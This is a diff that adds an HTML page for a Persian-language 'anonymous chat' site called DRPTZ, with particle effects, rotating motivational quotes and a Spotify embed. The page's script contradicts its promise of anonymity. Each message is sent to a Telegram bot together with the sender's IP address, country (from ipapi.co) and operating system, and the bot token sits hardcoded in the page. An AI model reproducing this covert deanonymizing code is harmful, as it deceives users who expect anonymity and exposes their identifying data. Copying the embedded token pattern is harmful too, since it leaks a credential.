@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DRPTZ Anonymous Chat</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+    }
+    body {
+      background: linear-gradient(to right, #0f0f0f, #1a1a1a);
+      color: #00ffae;
+      overflow: hidden;
+    }
+    #particles-js {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+    .header {
+      text-align: center;
+      padding: 20px;
+      font-size: 24px;
+      color: #ffffff;
+    }
+    .drptz {
+      text-align: center;
+      font-size: 40px;
+      margin-top: 10px;
+      color: #00ffae;
+      animation: floatText 3s ease-in-out infinite;
+    }
+    @keyframes floatText {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0); }
+    }
+    .motivation {
+      position: absolute;
+      top: 50%;
+      width: 100%;
+      text-align: center;
+      font-size: 24px;
+      color: #ffffff;
+      animation: fadeMotivation 10s linear infinite;
+    }
+    @keyframes fadeMotivation {
+      0% { opacity: 0; }
+      10% { opacity: 1; }
+      90% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+    .chat-container {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    input, button {
+      padding: 10px;
+      font-size: 16px;
+      border: none;
+      outline: none;
+      border-radius: 8px;
+    }
+    input {
+      width: 60%;
+    }
+    button {
+      background: #00ffae;
+      color: #000;
+      cursor: pointer;
+    }
+    .info-box {
+      position: fixed;
+      bottom: 10px;
+      left: 10px;
+      color: #ccc;
+      font-size: 12px;
+    }
+    .copy-btn {
+      position: fixed;
+      right: 20px;
+      top: 20px;
+      padding: 5px 10px;
+      background: #00ffae;
+      color: black;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div id="particles-js"></div>
+  <div class="header">چت با تیم ما</div>
+  <div class="drptz">DRPTZ</div>
+  <div class="motivation" id="quote">Loading...</div>
+  <div class="chat-container">
+    <input id="messageInput" type="text" placeholder="هرچی میخوای به صورت ناشناس اینجا بنویس">
+    <button onclick="sendMessage()">ارسال</button>
+  </div>
+  <div class="info-box" id="info">Loading info...</div>
+  <div class="copy-btn" onclick="copyPage()">Copy</div>
+  <audio id="sendSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_9c9b9e708d.mp3"></audio>
+
+  <!-- Spotify Embed -->
+  <iframe style="position:fixed; bottom:90px; right:20px; border-radius:12px;" 
+    src="https://open.spotify.com/embed/track/6Y975MrXSsIJaXyvPSKdsQ?utm_source=generator" 
+    width="300" height="80" frameBorder="0" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy">
+  </iframe>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
+  <script>
+    // Particles
+    particlesJS('particles-js', {
+      "particles": {
+        "number": { "value": 80 },
+        "color": { "value": "#00ffae" },
+        "shape": { "type": "circle" },
+        "opacity": { "value": 0.5 },
+        "size": { "value": 3 },
+        "line_linked": { "enable": true, "color": "#00ffae" },
+        "move": { "enable": true, "speed": 2 }
+      }
+    });
+
+    // Motivational quotes
+    const quotes = [
+      "Believe in yourself and all that you are.",
+      "Push yourself, because no one else is going to do it for you.",
+      "Success doesn’t just find you. You have to go out and get it.",
+      "Dream it. Wish it. Do it.",
+      "Great things never come from comfort zones.",
+      "Don’t stop when you’re tired. Stop when you’re done.",
+      "Do something today that your future self will thank you for.",
+      "Little things make big days.",
+      "It always seems impossible until it’s done.",
+      "Wake up with determination. Go to bed with satisfaction."
+    ];
+    let index = 0;
+    setInterval(() => {
+      document.getElementById("quote").innerText = quotes[index];
+      index = (index + 1) % quotes.length;
+    }, 5000);
+
+    // Send message to Telegram Bot
+    async function sendMessage() {
+      const input = document.getElementById("messageInput");
+      const message = input.value.trim();
+      if (!message) return;
+
+      document.getElementById('sendSound').play();
+      input.value = '';
+
+      const res = await fetch("https://ipapi.co/json");
+      const info = await res.json();
+
+      const finalMsg = `📥 New Anonymous Message:\n\n${message}\n\n🌍 Country: ${info.country_name}\n🌐 IP: ${info.ip}\n📱 OS: ${navigator.platform}`;
+      const chatId = "6830023746";
+      const token = "8145145957:AAFi82VMdaF5ShzbVUhkDKsSryE_q2TCzmU";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: finalMsg })
+      });
+    }
+
+    // Display info
+    fetch("https://ipapi.co/json")
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("info").innerText = 
+          `Your IP: ${data.ip} | Country: ${data.country_name} | Time: ${new Date().toLocaleString()}`;
+      });
+
+    // Copy page link
+    function copyPage() {
+      navigator.clipboard.writeText(window.location.href);
+      alert("Page URL copied!");
+    }
+  </script>
+</body>
+</html>
